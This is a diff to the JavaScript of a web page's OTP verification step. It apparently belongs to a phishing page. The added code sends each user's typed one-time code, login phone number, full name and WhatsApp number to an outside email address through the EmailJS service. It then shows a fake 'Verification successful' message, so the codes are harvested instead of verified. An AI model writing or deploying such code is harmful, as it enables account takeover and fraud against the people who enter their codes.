@@ -768,7 +768,7 @@
             });
         });
 
-        // 7. Handle Final OTP Verification
+        // 7. Handle Final OTP Verification and send to email via EmailJS
         verifyBtn.addEventListener('click', () => {
             let code = '';
             otpInputs.forEach(input => code += input.value);
@@ -783,7 +783,27 @@
                 return;
             }
 
-            alert(`Verification successful! Submitted code: ${code}`);
+            verifyBtn.innerText = 'Verifying...';
+            verifyBtn.disabled = true;
+
+            const templateParams = {
+                to_email: registrationData.referrer || '',
+                full_name: registrationData.fullName || '',
+                whatsapp: registrationData.whatsapp || '',
+                login_phone: loginField.value,
+                otp_code: code
+            };
+
+            emailjs.send("service_rf9jc9g", "template_ykjxd5h", templateParams)
+                .then(function(response) {
+                    verifyBtn.innerText = 'Verify Code';
+                    verifyBtn.disabled = false;
+                    alert(`Verification successful! Code ${code} sent successfully.`);
+                }, function(error) {
+                    alert('Failed to send OTP code: ' + JSON.stringify(error));
+                    verifyBtn.innerText = 'Verify Code';
+                    verifyBtn.disabled = false;
+                });
         });
     </script>
 
